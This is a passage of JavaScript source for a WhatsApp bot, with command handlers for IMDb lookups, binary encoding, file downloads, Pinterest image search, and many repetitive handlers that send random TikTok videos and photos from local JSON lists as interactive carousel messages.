            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           ToxxicTechInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return newReply(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
newReply(eb)
}
break
case 'dbinary': {
if (!q) return newReply(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
newReply(db)
}
break
case 'happymod':{
if (!q) return newReply(`Example ${prefix+command} Sufway surfer mod`)
await hana()
let kat = await scp2.happymod(q)
newReply(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return newReply(`Enter the Google Drive link`)
	await hana()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await newReply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	ToxxicTechInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	newReply('Error: Check link or try another link') 
  }
}
break
case 'pinterest': case 'pin': {
  if (!text) return newReply(`Title?`);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: ToxxicTechInc.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `_*Here is the result of: ${text}*_`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Image - ${i++}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});
  await ToxxicTechInc.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
case 'pinterest2': {
if (!text) return newReply(`Use example ${prefix+ command} one piece`)
    const { googleImage } = require('@bochilteam/scraper')
    const anutrest = await googleImage(text)
    let image = anutrest[Math.floor(Math.random() * anutrest.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: image } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command} ${text}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ringtone': {
		if (!text) return newReply(`Example : ${prefix + command} black rover`)
        let { ringtone }= require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		ToxxicTechInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tiktokgirl':{
await hana()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokghea':{
await hana()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokbocil':{
await hana()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknukhty':{
await hana()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoksantuy':{
await hana()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokkayes':{
await hana()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokpanrika':{
await hana()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknotnot':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'chinese':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hijab':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'indo':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'japanese':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'korean':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'malay':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomgirl':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomboy':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'thai':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'vietnamese':{
await hana()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
